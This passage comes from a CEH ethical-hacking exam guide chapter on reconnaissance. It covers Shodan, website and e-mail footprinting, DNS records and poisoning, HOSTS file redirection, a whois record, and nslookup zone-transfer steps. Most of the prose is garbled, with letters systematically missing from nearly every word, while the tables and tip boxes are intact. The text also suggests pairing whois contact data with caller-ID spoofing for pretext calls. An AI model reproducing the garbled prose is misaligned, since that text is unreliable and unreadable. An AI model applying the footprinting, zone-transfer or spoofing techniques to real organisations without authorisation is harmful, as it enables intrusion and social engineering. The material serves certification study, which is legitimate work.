blid luck i h ibl movi), mos Eas ggs a usually accssibl by som
wid combiaio of sps ad clicks. O somims i’s jus pa of h way higs
wok. Fo xampl, a log, log im ago Excl had a Eas gg ha showd com-
puizd imags of h buss of h dvlops.

(continued )

02-ch02.indd 63 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

64

Googl has a o of Eas ggs (a good lis of hm ca b foud a hps://
sachgilad.com/h-big-lis-of-googl-as-ggs-153768). Fo xampl, op
Googl ad sa ypig Do a barrel roll ad pss enter: h i sc will
(somims bfo you v fiish ypig) pfom a bal oll. Aoh? Typ
askew i h sach y ad pss enter: h dfiiio will appa, ad h pag
will b…askw. Typ pacman ad you’ll b playig a small vsio h old favoi
acad gam osc.

I could go o ad o ad wi a i scio calld “Fu wih Googl,” bu you
g h poi. Sach, xplo, ad hav som fu. Th’s ply of im o sudy, ad
who says you ca’ hav fu whil doig i? Bsids, you may ally wa o kow how
may dgs of spaaio Zach Galifiaakis has fom Kvi Baco. Doig a sach
fo Bacon number Zach Galifianakis usd o l you kow ha h asw is 2. Sadly
hough, o all Eas ggs hag aoud fov, so joy hm whil hy las.

Lasly, Googl also offs aoh a opio calld Advacd Sach. If you poi
you bows o www.googl.com/advacd_sach, may of hs sigs w y so ds-
paly o mmb a ak ca of ad laid ou i a ic GUI foma. Th op po-
io of h Advacd Sach pag pomps “Fid pags wih…” ad povids opios o
choos fom. Scoll dow jus a ad, ad h x scio ads “Th aow you suls
by…,” povidig opios such as laguag, las updad, ad wh spcific ms appa
i o o h si. Ad a h boom of h pag, h a a fw liks fo oh hlpful
sach opios, such as “Fid pags ha a similia o a URL.” I cosidd addig a
picu of i h, bu i’s mo ha a full pag i h bows. Th foma is asy ough,
ad I do’ hik you’ll hav a poblm wokig you way aoud i.

Shodan
Hacks a vy ouchy folks wh i coms o hi favoi ools. Tak ou fidly
ch dio as a xampl. H w aly apoplcic wh I glcd o mio
Shoda i a pvious diio: “I’s h hack’s sach gi, Ma! How ca you NOT
alk abou i?!?”

Whil Googl ad oh sach gis idx wbsis, Shoda (hps://www.shohda
.io) idxs py much vyhig ls. I oh wods, if i’s cocd o h I
ad availabl, Shoda will fid i. Ad jus wha sos of higs show up? You am i: ou-
s, svs, baby moios, wb cams, wa am faciliis, TVs, figaos, yachs,
hmosas, mdical dvics, affic lighs, wid ubis, lics pla ads…h lis
is dlss. Shoda simply shows you ayhig ha’s pluggd io h I—v if i
should’ b. Ad ha, fo ay lvl of hical hackig, should b py xciig fo you.

Shoda woks by yig o coc o, lially, vy IP addss o h pla. As h
cocio qus is ud, h ifomaio povids Shoda a glimps as o wha
h dvic o h oh d acually is. Figu 2-2 shows h Shoda opig pag.
Click Sign Up Now ad you ca h choos Gig Sad ad s op sachs ohs
hav id, as wll as a hos of oh ifomaio. Scollig dow af loggig i shows
v mo pos ad ifomaio.

02-ch02.indd 64 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

65

Figure 2-2 Shodan

As a vy quick, vy simpl xampl, Figu 2-3 shows h sach sul pag fo
D-Lik (a wll-kow, ad popula, Wi-Fi ou ad sma hom IoT maufacu).
Shoda happily displays all ba fidigs i kows abou coaiig h sig D-Lik.
Clickig hough h liks acoss h pag, you ca fid lad xplois, maps, imags,
pos, ad all sos of ifo. If you wa o phaps aow h scop of ha sach, you
ca us fils (much lik you ca do i Googl). Fo xampl, ciy: will fid dvics i
a paicula ciy (apach ciy: "Sa Facisco" will fid Apach wihi h ciy of Sa
Facisco), whil couy: fids dvics i a spcific couy. Ohs, such as hosam:,
:, po:, ad bfo/af: ca sigificaly focus you ffos.

Shoda also povids ply of hlp ad advic fo folks waig o us i. This hlp
pag (hps://hlp.shoda.io/h-basics/sach-quy-fudamals) povids all sos

Figure 2-3 Shodan sample

02-ch02.indd 65 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

66

of ifo o g you sad o sachig wih Shoda, ad h’s also a blog ha povids
os of hlpful ifomaio (hps://blog.shoda.io/udsadig-h-shoda-sach-
quy-syax/). Fially, if you’ jus isd i copyig ad pasig som sach
sigs o s wha Shoda dos, h a os of sis ha povid all sos of sampl
sigs fo you o y.

Website and E-mail Footprinting
Wbsi ad -mail foopiig may qui a lil mo ffo ad chical kowl-
dg, bu i’s woh i (o o mio EC-Coucil has dvod wo i slid show
scios o h maial, so you know i’s goa b good). Aalyzig a wbsi fom afa
ca show poially isig ifomaio, such as sofwa i us, OS, filams,
pahs, ad coac dails. Usig ools such as Bup Sui (hps://poswigg./bup)
ad Wbsi Ifom (hps://wbsi.ifom.com/) allows you o gab hads ad
cookis, ad la cocio saus, co yp, ad wb sv ifomaio. Hck,
pullig h HTML cod islf ca povid usful il. You migh b supisd wha
you ca fid i hos “hidd” filds, ad som of h comms how abou i h
cod may pov hady. A viw of cookis migh v show you sofwa o scipig
mhods i us. E-mail hads povid mo ifomaio ha you migh hik ad
a asy ough o gab ad xami. Ad ackig -mail? Hy, i’s o oly usful fo
ifomaio, i’s jus dowigh fu.

Alhough i dos’ sm all ha passiv, wb mioig is a ga mhod fo foo-
piig. Copyig a wbsi dicly o you sysm (“mioig” i) ca dfiily hlp
spd higs alog. Havig a local copy o play wih ls you div dp io h suc-
u ad ask higs lik “Wha’s his dicoy fo ov h?” ad “I wod if his si is
vulabl o fill-in-chosen-vulnerability?” wihou alig h ag ogaizaio. Tools
fo accomplishig wb mioig a may ad vaid, ad whil h followig lis is’
psaiv of vy wb mioig ool ou h, i’s a good sa:

• HTTack (hps://www.hack.com)

• BlackWidow (hps://sofbylabs.com/wp/blackwidow)

• Tlpo Po (hps://www.max.com/lpo/po)

• GNU Wg (hps://www.gu.og/sofwa/wg)

• BackS Bows (www.spadixbd.com/backs)

Alhough i’s ga o hav a local, cu copy of you ag wbsi o pus,
l’s o fog ha w ca la fom hisoy oo. Ifomaio lva o you ffos
may hav b posd o a si a som poi i h pas bu has sic b updad o
movd. EC-Coucil absoluly lovs his as a ifomaio-gahig souc, ad you a
cai o s Wayback Machi ad Googl Cach quid somwh o you xam.
Th Wayback Machi, availabl a hps://achiv.og (s Figu 2-4), kps sapshos
of sis fom days go by, allowig you o go back i im o sach fo los ifomaio;
fo xampl, if h compay oously had a pho lis availabl fo a log whil bu
has sic ak i dow, you may b abl o iv i fom a “way back” copy. Ths
opios povid isigh io ifomaio you ag may hav hough hy’d safly go-
 id of—bu as h old adag says, “Oc posd, always availabl.”

02-ch02.indd 66 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

67

Figure 2-4 Internet Archive’s Wayback Machine

NOTE WebSite-Watcher (https://www.aignes.com) can be used to check
web pages or changes, automatically notiying you when there’s an update.

Ad l’s o fog good old -mail as a foopiig souc h. E-mail commuica-
io ca povid us IP addss ad physical locaio ifomaio. Liks visid by h
cipi may also b availabl, as wll as bows ad OS ifomaio. Hck, you ca
somims v s how log hy spd reading h -mail.

Hav you v acually lookd a a -mail had? You ca ally g som xaodiay
dail ou of i, ad somims sdig a bogus -mail o h compay ad wachig wha
coms back ca hlp you pipoi a fuu aack vco (s Figu 2-5 fo a xampl). If
you wa o go a sp fuh, you ca y som of h may -mail ackig ools. E-mail
ackig applicaios ag fom asy, buil-i ffos o h pa of you -mail applicaio
povid (such as a ad cip ad h lik wihi Micosof Oulook) o xal apps ad
ffos fom placs such as EmailTackPo (www.mailackpo.com) ad MailTackig
(www.mailackig.com). Simply appdig “.mailackig.com” o h d of a -mail
addss, fo xampl, ca povid a hos of ifomaio abou wh h -mail avls ad
how i gs h. Exampls of oh ools fo -mail ackig iclud GNoify, Coac-
Moky, Yswa, RadNoify, WhoRadM, Tac Email Aalyz, ad Zdio.

DNS Footprinting
I ha gig los. Now, I’m o sayig I’m always h calmest div ad ha I do’
complai (loudly) abou cicumsacs ad oh divs o h oad, bu I ca hosly
say ohig pus m o dg lik o kowig wh I’m goig whil divig, spcially
wh h dicios giv o m do’ iclud h oad ams. I’m cai you kow wha
I’m alkig abou—dicios ha say, “Tu by h yllow sig x o h dugso ad

02-ch02.indd 67 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

68

Figure 2-5 E-mail header

h go dow half a mil ad u igh oo h oad bsid h walus-hid facoy. You
ca’ miss i.” Iviably I do wid up missig i, ad cusig sus.

Thakfully, goiaig h I is’ lia o cazd dicios. Th oad sigs
w hav i plac o g o ou favoi haus a all pa of DNS, ad hy mak aviga-
io asy. DNS, as you’ o doub alady awa, povids a am-o-IP-addss (ad
vic vsa) mappig svic, allowig us o yp i a am fo a souc as opposd o is
umical addss. This also povids a walh of foopiig ifomaio fo h hical
hack—so log as you kow how o us i.

DNS Basics
As w sablishd i h ioducio (you did ad i, igh?), h a cai higs
you’ jus xpcd o kow bfo udakig his cificaio ad ca fild, ad
DNS is o of hm. So, o, I’m o goig o spd pags covig DNS. Bu w do
d o ak a las a coupl of mius o go ov som basics—maily bcaus you’ll
s his suff o h CEH xam. Th simpls xplaaio of DNS I ca hik of follows.

DNS is mad up of svs all ov h wold. Each sv holds ad maags h
cods fo is ow lil co of h glob, kow i h DNS wold as a namespace.
Each of hs cods givs dicios o o fo a spcific yp of souc. Som cods
povid IP addsss fo idividual sysms wihi you wok, whas ohs povid
addsss fo you -mail svs. Som povid pois o oh DNS svs, which a
dsigd o hlp popl fid wha hy’ lookig fo.

02-ch02.indd 68 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

69

NOTE Port numbers are always important in discussing anything network-
wise. When it comes to DNS, 53 is your number. Name lookups generally use
UDP, whereas zone transers use TCP.

Big, hug svs migh hadl a amspac as big as h op-lvl domai “.com,”
whas aoh sv fuh dow h li holds all h cods fo “mhducaio
.com.” Th bauy of his sysm is ha ach sv oly has o woy abou h am
cods fo is ow poio of h amspac ad o kow how o coac h sv
“abov” i i h chai fo h op-lvl amspac h cli is askig abou. Th i
sysm looks lik a ivd , ad you ca s how a qus fo a paicula souc
ca asily b oud cocly o h appopia sv. Fo xampl, i Figu 2-6,
h sv fo ayam.com i h hid lvl holds ad maags all h cods fo ha
amspac, so ayo lookig fo a souc (such as hi wbsi) could ask ha sv
fo a addss.

“.”

Root

Top level – “Parent domain”

Second level – “Child domain”

Third level – Hosts and resources

Figure 2-6 DNS structure

02-ch02.indd 69 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

70

NOTE One more “or the un o it” link or you: https://www.iana.org/domains/
root/servers will show you all the root servers and who “owns” them.

Th oly dowsid o his sysm is ha h cod yps hld wihi you DNS
domai ca ll a hack all sh ds o kow abou you wok layou. Fo xampl,
do you hik i migh b impoa fo a aack o kow which sv i h wok
holds ad maags all h DNS cods? Wha abou wh h -mail svs a? Hck,
fo ha ma, would’ i b bficial o gais his o which sysms may bhold
public-facig wbsis? All his may b dmid by xamiig h DNS cod yps,
which I’v so kidly lisd i Tabl 2-2.

EXAM TIP Know the DNS record types well and be able to pick them out o a
lineup. You will deinitely see a DNS zone transer on your exam and will be
asked to identiy inormation about the target rom it.

Ths cods a maiaid ad maagd by h auhoiaiv sv fo you
amspac (h SOA), which shas hm wih you oh DNS svs (am svs)

DNS Record Type  Label  Description

SRV Service This record deines the hostname and port number
o servers providing speciic services, such as a
Directory Services server.

SOA Start o Authority This record identiies the primary name server or
the zone. The SOA record contains the hostname
o the server responsible or all DNS records within
the namespace, as well as the basic properties o
the domain.

PTR Pointer This maps an IP address to a hostname (providing
or reverse DNS lookups). You don’t absolutely
need a PTR record or every entry in your DNS
namespace, but these are usually associated with
e-mail server records.

NS Name Server This record deines the name servers within your
namespace. These servers are the ones that respond
to your clients’ requests or name resolution.

MX Mail Exchange This record identiies your e-mail servers within
your domain.

CNAME Canonical Name This record provides or domain name aliases
within your zone. For example, you may have an
FTP service and a web service running on the same
IP address. CNAME records could be used to list
both within DNS or you.

A Address This record maps an IP address to a hostname and
is used most oten or DNS lookups.

Table 2-2 DNS Record Types

02-ch02.indd 70 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

71

so you clis ca pfom lookups ad am soluios. Th pocss of plicaig
all hs cods is kow as a zone transfer. Cosidig h impoac of h cods
kp h, i is obvious admiisaos d o b caful abou which IP addsss a
acually allowd o pfom a zo asf—if you allowd jus ay IP addss o ask fo
a zo asf, you migh as wll pos a wok map o you wbsi o sav vyo
h oubl. Bcaus of his, mos admiisaos sic h abiliy o v ask fo a zo
asf o a small lis of am svs isid hi wok. Addiioally, som admis
do’ v cofigu DNS a all ad simply us IP addsss fo hi ciical hoss.

NOTE When it comes to DNS, it’s important to remember there are two real
servers in play within your system. Name resolvers simply answer requests.
Authoritative servers hold the records or a namespace, given rom an
administrative source, and answer accordingly.

A addiioal o is lva o h discussio h, v hough w’ o i h
aacks poio of h book y. Thik fo a mom abou a DNS lookup fo a souc
o you wok: say, fo isac, a pso is yig o coc o you FTP sv o
upload som impoa, ssiiv daa. Th us yps i ftp.anycomp.com ad psss
enter. Th DNS sv closs o h us (dfid i you TCP/IP popis) looks
hough is cach o s whh i kows h addss fo fp.aycomp.com. If i’s o
h, h sv woks is way hough h DNS achicu o fid h auhoia-
iv sv fo aycomp.com, which mus hav h coc IP addss. This spos is
ud o h cli, ad FTP-ig bgis happily ough.

Suppos, hough, you a a aack ad you really wa ha ssiiv daa youslf.
O way o do i migh b o chag h cach o h local am sv o poi o a
bogus sv isad of h al addss fo fp.aycomp.com. Th h us, o h
wis, would coc ad upload h docums dicly o you sv. This pocss is
kow as DNS poisoning, ad i was of ough impoac ha a i xsio o
DNS was cad way back i 1999.

DNS was dsigd i h 1980s wh scuiy, o say h las, was o a pim
coc. As oigially dsigd, a cusiv solv i DNS had o way o vify h
auhiciy of h spos ad, hfo, could o dc a fogd spos o o
of is quis. This ma a aack could masquad as h auhoiaiv sv ad
dic a us o a poially malicious si wihou h us v alizig i.

NOTE Dan Kaminsky, amous or making DNS vulnerabilities widely known
back in 2008 to 2010 (see, e.g., http://unixwiz.net/techtips/iguide-kaminsky-
dns-vuln.html), passed away in 2021 at the age o 42. He was instrumental
in inding numerous DNS vulnerabilities (to include some o the “astest
to respond” kinds o things allegedly used by governments to portend
themselves as certain websites), and his passing is a huge loss to security
circles everywhere.

Domai Nam Sysm Scuiy Exsios (DNSSEC) is a sui of I Egi-
ig Task Foc (IETF) spcificaios ha addsss his issu by usig digial siga-
us o bols auhicaio. Usig a public ky cypogaphy sysms, DNSSEC sigs

02-ch02.indd 71 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

72

DNS daa, addig wo impoa faus: daa oigi auhicaio (povidig solv-
s mas o cypogaphically vify ha daa civd acually cam fom h usd
zo), ad daa igiy pocio (povidig h solv mas o kow ha h daa
has’ b modifid i asi).

EXAM TIP Another DNS poisoning mitigation eort is to restrict the amount
o time records can stay in cache beore they’re updated.

Th SOA cod povids loads of ifomaio, fom h hosam of h pimay
sv i h DNS amspac (zo) o h amou of im am svs should ai
cods i cach. Th cod coais h followig ifomaio (all dfaul valus a
fom Micosof DNS sv sigs):

• Source host Hosam of h pimay DNS sv fo h zo (h should
b a associad NS cod fo his as wll).

• Contact e-mail E-mail addss of h pso sposibl fo h zo fil.

• Serial number Rvisio umb of h zo fil. This umb icms ach
im h zo fil chags ad is usd by a scoday sv o kow wh o
upda is copy (if h SN is high ha ha of h scoday, i’s im o upda!).

• Refresh time Th amou of im a scoday DNS sv will wai bfo
askig fo updas. Th dfaul valu is 3600 scods (1 hou).

• Retry time Th amou of im a scoday sv will wai o y if h zo
asf fails. Th dfaul valu is 600 scods (10 mius).

• Expire time Th maximum amou of im a scoday sv will spd
yig o compl a zo asf. Th dfaul valu is 86,400 scods (1 day).

• TTL Th miimum “im o liv” fo all cods i h zo. If o updad by
a zo asf, h cods will pish. Th dfaul valu is 3600 scods (1 hou).

Is That a Forest Behind Those Trees?
DNS is udoubdly h magic uig h machi. Wihou h abiliy o quickly
ad fficily asla a am o a IP addss, h I migh’v boggd dow
log, log ago. Su, w migh’v usd i fo ducaio ad fil asfs, bu ca
ayo imagi h I wihou www.insertnamehere.com? Ad i’s pcisly
bcaus of ha as of us, ha abiliy o jus yp a am ad click “go,” wihou
ally kowig xacly wh you’ hadd, ha somims causs haach ad
hadach fo scuiy psol. Jus imagi h havoc isid a ogaizaio if a
bad guy somhow go hold of h DNS svs ad sad poiig popl o placs
hy’d v kowigly go. Bu if you hik abou how am lookup really happs
o a machi, you may o v d o g o h DNS sysm as a whol o caus
al poblms.

02-ch02.indd 72 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

73

I gal, wh you yp a URL i a bows o a Widows machi, h sys-
m aks a coupl laps locally before chckig DNS. Fis, h OS chcks o s if
h qus is fo islf (ha is, localhos o is ow am). If o, i’ll h quy h
local HOSTS fil. If h am soluio is’ foud h, then i’ll go o DNS ad
quy (i od) h local cach, h pimay (local) DNS sv, ad h ayhig
i ca fid i h iy of h DNS sysm i ca g o. If, agai, o am is
foud, Widows will u o NBIOS, WINS, ad h LMHOSTS fil.

S how his ca bcom a issu? A ach sp, if a am soluio is foud, h
pocss sops ad h sach ds. Thfo, if h real am soluio is i sp
fou, bu you ca fid a way o ijc a fak o i sp 2, h why boh hack-
ig DNS i a ogaizaio if you ca gab ad plac a HOSTS fil o h box?
Ty i youslf o you hom sysm. Naviga o C:\Widows\Sysm32\Divs\
c\ ad op h HOSTS fil i Nopad. Add a y lik his:

# 50.62.134. 34 google.com

Sav, clos vyhig, ad h op a bows ad y o op Googl.com. Th
wos pag o h I appas isad. Why? Bcaus oc Widows foud h
am soluio, i soppd lookig: o d o boh DNS wh h asw is
igh h i h HOSTS fil.

S how his ca g haiy ad dagous ally quickly? If a aack ca sim-
ply add a coupl lis of x o h HOSTS fil o h machi, h o sh could
dic affic wihou h us v havig o ouch DNS at all. Bu whil w’
all awa (o should b ayway) of h impoac of pocig accss o ha pa-
icula fil o pv bad guys fom usig i, hav you v cosidd usig i fo
good puposs?

Why o upda you HOSTS fil o “blackhol” sis you kow o b malicious?
Why o dic accss quss o sis you mploys a o supposd o b vis-
iig a wok o a fidly mid si o a valid busiss si? S, you sysm is
goig o chck h HOSTS fil bfo makig ay ips o solv ams i h fis
plac, so whav you pu h is law as fa as a PC is cocd.

Pull up a sach gi ad look up “hoss fil lis.” You’ll fid sval HOSTS
fil vsios o go o, ad af cafully scig hm youslf, of cous, you may
fid implmig hm i you busiss o hom savs you a malwa icid
o wo i h fuu. Fo xampl, I highly commd you chck ou hps://
gihub.com/Ulima-Hoss-Blacklis/Ulima.Hoss.Blacklis. O you could jus
coiu havig fu ad sd all Googl.com quss o a dacig hams vido.
I ay cas, do’ igo his simpl souc i a amp o b you scuiy.
I’s asy, ad i woks.

Ad, of cous, do’ fog o dl ha y w addd ali fom you
HOSTS fil. Ulss you jus lik ha pag. Ugh.

P.S. Ad do’ g m sad o h LMHOSTS fil o Widows sysms.
Which, as you kow, gs chckd v bfo h HOSTS fil.

02-ch02.indd 73 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

74

I hik, by ow, i’s faily vid why DNS foopiig is a impoa skill fo you
o mas. So, ow ha you kow a lil abou h DNS sucu ad h cods kp
h (b su o viw hm wll bfo you xam—you’ll hak m la), i’s impo-
a fo us o ak a look a som of h ools availabl fo you us as a hical hack.
Th followig discussios wo’ cov vy ool availabl—ad you wo’ b abl o
poclaim youslf a xp af adig hm—bu you do d o kow h basics fo
you xam, ad w’ll mak su o hi wha you d.

I h daw of wokig im, wh diosaus oamd ousid h buildigs ad
cas had a choic bw gula ad uladd gas, sig up DNS quid o oly a
hiachical dsig bu somo o maag i. Pu simply, somo had o b i chag
of gisig who owd wha am ad which addss ags w wih i. Fo ha
ma, somo had o had ou h addsss i h fis plac.

IP addss maagm sad wih a happy lil goup kow as h I
Assigd Numbs Auhoiy (IANA), which fially gav way o h I Copoaio
fo Assigd Nams ad Numbs (ICANN). ICANN maags IP addss allocaio ad
a hos of oh higs. So, as compais ad idividuals g hi IP addsss (ags),
hy simulaously d o su h s of h wold ca fid hm i DNS. This is
do hough o of ay umb of domai am gisas woldwid (fo xampl,
www.woksoluios.com, www.godaddy.com, ad www.gis.com). Alog wih
hos gisa busisss, h followig fiv gioal I gisis (RIRs) povid
ovall maagm of h public IP addss spac wihi a giv gogaphic gio:

• American Registry for Internet Numbers (ARIN) Caada, may Caibba
ad Noh Alaic islads, ad h Uid Sas

• Asia-Pacific Network Information Center (APNIC) Asia ad h Pacific

• Réseaux IP Européens (RIPE) NCC Euop, Middl Eas, ad pas of
Cal Asia/Noh Afica (full am is i Fch)

• Latin America and Caribbean Network Information Center (LACNIC) Lai
Amica ad h Caibba

• African Network Information Center (AfriNIC) Afica

Obviously, bcaus hs gisis maag ad cool all h public IP spac, hy
should ps a walh of ifomaio fo you i foopiig. Gahig ifoma-
io fom hm is as asy as visiig hi sis (ARIN’s is www.ai.) ad ipuig
a domai am. You’ll g ifomaio such as h wok’s ag, ogaizaio am,
am sv dails, ad oigiaio das. Figu 2-7 shows a gioal covag map fo
all h gisis.

You ca also mak us of a ool kow as whois. Oigially sad i Uix, whois has
bcom ubiquious i opaig sysms vywh ad has gad ay umb of
wbsis s up spcifically fo ha pupos. I quis h gisis ad us ifoma-
io, icludig domai owship, addsss, locaios, ad pho umbs.

To y i fo youslf, us you favoi sach gi ad yp i whois. You’ll g
millios of his o vyhig fom h us of h commad li i Uix o wbsis
pfomig h ask fo you. Fo xampl, h scod spos o my sach ud

02-ch02.indd 74 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

75

Figure 2-7 Regional registry coverage map

www.whois.sc—a si I’v usd bfo. Op h si ad yp i mheducation.com (h
si fo McGaw Hill, my publish). You’ll fid all kids of a ifomaio a h op
o h pag—gisa og, gisa, saus, IP addss, wh i’s locad, da cad
(ad las im h cod was updad), how may sis a hosd o h sam sv
(2.843), how log McGaw Hill ca kp h am wihou -uppig (xpis Ju 8 of
2022), ad v how may imag fils o h si a missig al ags (six).

Scoll dow, ad h whois cod islf is displayd (ud Raw Whois Daa). I’v cop-
id poios of i h fo you viw. Noic h admiisaiv, chical, ad gisa
coac ifomaio displayd ad how McGaw Hill sud i was lisd as a busiss
am isad of a idividual—way o go! Addiioally, oic h h mai DNS sv-
s fo h amspac lisd a h boom, as wll as ha (ahm) oic o DNSSEC.

Domain Name: mheducation.com
Registry Domain ID: 28866363_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.corporatedomains.com
Registrar URL: www.cscprotectsbrands.com
Updated Date: 2021-06-04T01:14:05Z
Creation Date: 2000-06-08T17:53:21.000-04:00
Registrar Registration Expiration Date: 2022-06-08T21:53:21Z
Registrar: CSC CORPORATE DOMAINS, INC.
Registrar IANA ID: 299
Registrar Abuse Contact Email:
Registrar Abuse Contact Phone: +1.8887802723
Domain Status: clientTransferProhibited http://www.icann.org/
epp#clientTransferProhibited
Registry Registrant ID:
Registrant Name: Domain Administrator
Registrant Organization: McGraw-Hill Global Education Holdings, LLC
Registrant Street: 2 Penn Plaza
Registrant City: New York
Registrant State/Province: NY
Registrant Postal Code: 10121

02-ch02.indd 75 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

76

Registrant Country: US
Registrant Phone: +1.6094265291
Registrant Phone Ext:
Registrant Fax: +1.6094265291
Registrant Fax Ext:
Registrant Email:
Registry Admin ID:
Admin Name: Domain Administrator
Admin Organization: McGraw-Hill Global Education Holdings, LLC
Admin Street: 2 Penn Plaza
Admin City: New York
Admin State/Province: NY
Admin Postal Code: 10121
Admin Country: US
Admin Phone: +1.6094265291
Admin Phone Ext:
Admin Fax: +1.6094265291
Admin Fax Ext:
Admin Email:
Registry Tech ID:
Tech Name: Domain Administrator
Tech Organization: McGraw-Hill Global Education Holdings, LLC
Tech Street: 2 Penn Plaza
Tech City: New York
Tech State/Province: NY
Tech Postal Code: 10121
Tech Country: US
Tech Phone: +1.6094265291
Tech Phone Ext:
Tech Fax: +1.6094265291
Tech Fax Ext:
Tech Email:
Name Server: pdns85.ultradns.biz
Name Server: pdns85.ultradns.com
Name Server: pdns85.ultradns.net
Name Server: pdns85.ultradns.org
DNSSEC: unsigned

EXAM TIP You’re going to need to be amiliar with whois output, paying
particular attention to registrant and administrative names, contact
numbers or individuals, and the DNS server names.

If you do a sach o wo o som local busiss domais, I’d b lag sums of cash
you’ll fid idividuals lisd o may of hm. Ad I’m su a fw of you a sayig,
“So wha? Wha’s h big dal i kowig h pho umb o ach a paicula
idividual?” Wll, wh you combi ha ifomaio wih soucs such as Spoof-
Cad (www.spoofcad.com), you hav a ady-mad aack s up. Imagi spoofig h
pho umb you jus foud as blogig o h chical poi of coac (POC) fo
h wbsi ad callig aly ayo isid h ogaizaio o ask fo ifomaio.
Call ID is a ga hig, bu i ca also lad o asy aacks fo a clv hical hack.

02-ch02.indd 76 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

77

Los of whois oupus will giv you all h pho umbs, -mail addsss, ad oh
ifomaio you’ll d la i you aacks.

NOTE As o December 2010, the Truth in Caller ID Act (https://www.congress
.gov/bill/111th-congress/senate-bill/30 ) stated a person who knowingly
transmits misleading caller ID inormation can be hit with a $10,000 ine
per incident.

Aoh usful ool i h DNS foopiig ools is a old sadby, a commad-
li ool popl hav usd sic h daw of wokig: slookup. This is a commad
ha’s pa of viually vy opaig sysm i h wold, ad i povids a mas o
quy DNS svs fo ifomaio. Th syax fo h ool is faily simpl:

nslookup [-options] {hostname | [-server]}

Th commad ca b u as a sigl isac, povidig ifomaio basd o h
opios you choos, o you ca u i i iaciv mod, wh h commad us as
a ool, awaiig ipu fom you.

Fo xampl, o a Micosof Widows machi, if you simply yp nslookup a
h pomp, you’ll s a display showig you dfaul DNS sv ad is associad
IP addss. Fom h, slookup sis paily, waiig fo you o ask whav you wa
(his is kow as interactive mode). Fo xampl, h commad

set query=MX

lls slookup you’ lookig fo cods o -mail svs. Eig a domai am
af ha will u h IP addsss of all h mail svs DNS kows abou fo
ha amspac.

NOTE Typing a question mark in nslookup shows all the options and switches
you have available.

Th slookup commad ca also povid fo somhig kow as a zone transfer. As
sad ali, a zo asf diffs fom a “omal” DNS qus i ha i pulls vy
cod fom h DNS sv isad of jus h o, o o yp, you’ lookig fo. To us
slookup o pfom a zo asf, fis mak su you’ cocd o h SOA sv
fo h zo ad h y h followig sps:

1. E nslookup a h commad li.
2. Typ server IPAddress, usig h IP addss of h SOA. Pss enter.
3. Typ set type=any ad pss enter.
4. Typ ls -d domainname.com, wh domainname.com is h am of h zo,

ad h pss enter.

02-ch02.indd 77 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

78

Eih you’ll civ a o cod, bcaus h admiisao has do h job cocly,
o you’ll civ a copy of h zo asf, which looks somhig lik his:

Listing domain [anycomp.com]
Server: dn1234.anycomp.com
Host or domain name Resource Record Info.
anycomp.com. SOA dn1234.anycomp.com
hostmaster.anycomp.com (2013090800 86400 900 1209600 3600)
anycomp.com. NS DN1234.anycomp.com
anycomp.com. NS DN5678.anycomp.com
anycomp.com. A 172.16.55.12
anycomp.com. MX 30 mailsrv.anycomp.com
mailsrv A 172.16.101.5
www CNAME anycomp.com
fprtone A 172.16.101.15
fprttwo A 172.16.101.16

Th umbs i bold a of paicula impoac. I h SOA islf, 2013090800
is h sial umb, 86400 is h fsh ival, 900 is h y im, 1209600 is h
xpiy im, ad 3600 dfis h TTL fo h zo. If you mmb ou discussio
o DNS poisoig ali, i may b hlpful o kow h logs a bad DNS cach ca
suviv h is o hou (3600 scods). Also oic h MX cod sayig “Th sv
povidig ou -mail is amd mailsv.aycomp.com” followd by a A cod povidig
is IP addss. Tha’s impoa ifomaio fo a aack o kow, would’ you say?

TIP Ater inding the name servers or your target, type nslookup at the
command prompt to get into interactive mode and then change to your
target’s name server (by typing server servername). Perorming DNS
queries rom a server inside the network might provide better inormation
than relying on your own server.

Aoh opio fo viwig his ifomaio is h dig commad uiliy. Naiv o
